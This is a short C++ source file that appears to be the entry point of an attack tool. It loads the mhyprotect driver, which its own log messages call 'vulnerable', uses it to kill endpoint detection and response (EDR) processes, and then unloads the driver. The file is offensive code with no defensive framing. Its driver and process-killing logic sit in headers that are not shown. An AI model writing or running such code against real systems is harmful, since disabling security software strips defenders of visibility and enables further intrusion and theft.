#include <iostream>
#include "mhyprotect/mhyprotect.h"
#include "mhydeath/process_killer.h"

//
// main entry point
//
int main(int argc, const char** argv)
{
    //
    // clean previous instances
    //
    mhyprotect::clean();

    //
    // initialize its service, etc
    //
    if (!mhyprotect::init())
    {
        printf("[!] failed to initialize vulnerable driver\n");
        return -1;
    }

    //
    // initialize driver implementations
    //
    if (!mhyprotect::driver_impl::driver_init())
    {
        printf("[!] failed to initialize driver properly\n");
        mhyprotect::unload();
        return -1;
    }

    //
    // kill edr processes
    //
    process_killer::kill_target_processes();

    //
    // stop and delete service
    //
    mhyprotect::unload();

    return 0;
}